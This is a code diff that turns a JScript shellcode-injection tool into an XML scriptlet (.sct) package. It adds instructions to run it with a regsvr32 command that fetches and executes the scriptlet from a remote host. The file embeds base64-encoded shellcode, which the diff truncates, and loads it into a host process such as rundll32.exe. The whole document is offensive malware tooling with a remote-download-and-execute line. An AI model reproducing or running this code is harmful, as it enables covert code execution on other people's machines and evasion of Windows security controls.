@@ -22,13 +22,27 @@
    Run: cat payload.bin | base64 -w 0
    Copy the base64 encoded payload into the code variable below.
 
+   Execute: regsvr32 /s /n /u /i:http://domain.com/cactustorch.sct scrobj.dll
+
 */
+
+<?xml version="1.0" encoding="utf-8"?>
+<package>
+  <component
+    id="dummy">
+    <registration
+      description="dummy"
+      progid="dummy"
+      version="1.00"
+      remotable="True">
+      <script
+        language="JScript"><![CDATA[
 
 // Replace binary with a executable in both SYSTEM32 and SYSWOW64 that you want to use as container. eg. notepad.exe, calc.exe
 var binary = "rundll32.exe";
 
 // Replace code with base64 encoded 32 bit shellcode
-var code = "TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqzckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAAAAIAAAUAAAAAAAAABQAAAAA";
+var code = "TVroAAAAAFtSRVWJ5YHDco";
 
 
 // ------------ DO NOT EDIT BELOW HERE --------------
@@ -230,3 +244,7 @@ try {
 } catch (e) {
     debug(e.message);
 }
+}]]></script>
+    </registration>
+  </component>
+</package>
